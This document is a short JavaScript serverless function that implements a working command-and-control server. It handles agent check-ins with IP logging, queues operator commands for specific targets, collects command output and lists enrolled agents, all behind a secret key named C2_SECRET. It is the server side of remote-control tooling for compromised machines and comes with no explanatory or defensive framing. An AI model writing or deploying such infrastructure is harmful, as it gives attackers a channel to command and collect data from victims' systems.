const { kv } = require('@vercel/kv');

module.exports = async (req, res) => {
  const secret = process.env.C2_SECRET;
  const auth = req.headers['x-api-key'];
  if (auth !== secret) return res.status(401).json({ error: 'Unauthorized' });

  if (req.method === 'POST') {
    const { action, agent_id, data } = req.body;

    // Agent checks in — gets queued command
    if (action === 'checkin') {
      const cmd = await kv.lpop(`cmds:${agent_id}`) || null;
      const ts = Date.now();
      await kv.hset(`agents:${agent_id}`, { last_seen: ts, ip: req.headers['x-forwarded-for'] || 'unknown' });
      return res.json({ ok: true, cmd });
    }

    // Agent sends back result
    if (action === 'result') {
      await kv.rpush(`results:${agent_id}`, JSON.stringify({ ts: Date.now(), output: data }));
      return res.json({ ok: true });
    }

    // Operator pushes a command
    if (action === 'push_cmd') {
      const { target, cmd } = req.body;
      await kv.rpush(`cmds:${target}`, cmd);
      return res.json({ ok: true, queued: cmd });
    }

    // List all agents
    if (action === 'list_agents') {
      const keys = await kv.keys('agents:*');
      const agents = {};
      for (const k of keys) {
        agents[k.replace('agents:', '')] = await kv.hgetall(k);
      }
      return res.json({ ok: true, agents });
    }

    // Get results for agent
    if (action === 'get_results') {
      const { target } = req.body;
      const results = await kv.lrange(`results:${target}`, 0, -1);
      return res.json({ ok: true, results: results.map(r => JSON.parse(r)) });
    }
  }

  res.status(405).json({ error: 'Method not allowed' });
};
